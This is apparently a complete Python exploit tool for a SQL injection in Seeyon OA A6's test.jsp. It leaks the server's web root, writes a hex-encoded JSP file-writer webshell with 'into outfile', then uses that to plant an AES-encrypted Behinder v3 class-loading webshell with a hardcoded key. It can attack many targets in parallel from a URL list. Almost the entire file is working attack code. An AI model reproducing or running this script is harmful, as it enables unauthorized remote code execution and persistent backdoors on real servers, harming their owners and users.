import re
import time
import random
import argparse
import requests
import multiprocessing
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def POC_1(target_url):
    vuln_url = target_url + "yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
    console.print(now_time() + " [INFO]     正在检测致远OA A6 test.jsp SQL注入Getshell漏洞", style='bold blue')
    #console.print(now_time() + " [INFO]     正在请求 {}".format(vuln_url), style='bold blue')
    try:
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if '序号' in response.text and "@@basedir" in response.text and response.status_code == 200:
            OA_dir = re.findall(r'>(.*?)\\OA\\', response.text)[0]
            OA_dir = OA_dir + '/OA/tomcat/webapps/yyoa/'
            OA_dir = OA_dir.replace('\\', '/')
            console.print(
                now_time() + " [SUCCESS]  目标 {} 存在致远OA A6 test.jsp SQL注入Getshell漏洞, web绝对路径: {}".format(target_url,
                                                                                                        OA_dir),
                style='bold green')
            webshell_name = "test_upload{}.jsp".format(random.randint(1, 999))
            OA_dir = OA_dir + "{}".format(webshell_name)
            POC_2(target_url, OA_dir, webshell_name)
        else:
            console.print(now_time() + " [WARNING]  致远OA A6 test.jsp SQL注入Getshell漏洞利用失败", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


def POC_2(target_url, OA_dir, webshell_name):
    vuln_url = target_url + "yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27".format(
        OA_dir)
    try:
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if 'already' in response.text and response.status_code == 200:
            console.print(now_time() + " [WARNING]  文件写入木马上传失败, 目标已存在相同文件, 请重新运行", style='bold yellow')
        elif "No Data" in response.text and response.status_code == 200:
            console.print(now_time() + " [SUCCESS]  文件写入木马上传成功, 上传绝对路径: {}".format(OA_dir), style='bold green')
            POC_3(target_url, webshell_name)
        else:
            console.print(now_time() + " [WARNING]  木马上传失败, 请手动尝试进一步利用", style='bold yellow')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败", style='bold red')


def POC_3(target_url, webshell_name):
    rebe_webshell = "testwebshell{}.jsp".format(random.randint(1, 999))
    vuln_url = target_url + "yyoa/{}?f={}".format(webshell_name, rebe_webshell)
    data = "t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200:
            console.print(now_time() + " [SUCCESS]  冰蝎三默认木马上传成功: {}yyoa/{}".format(target_url, rebe_webshell),
                          style='bold green')
        else:
            console.print(now_time() + " [WARNING]  木马上传失败, 可能被拦截, 请手动尝试进一步利用", style='bold yellow')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败", style='bold red')


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    requests.packages.urllib3.disable_warnings()
    POC_1(target_url)


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
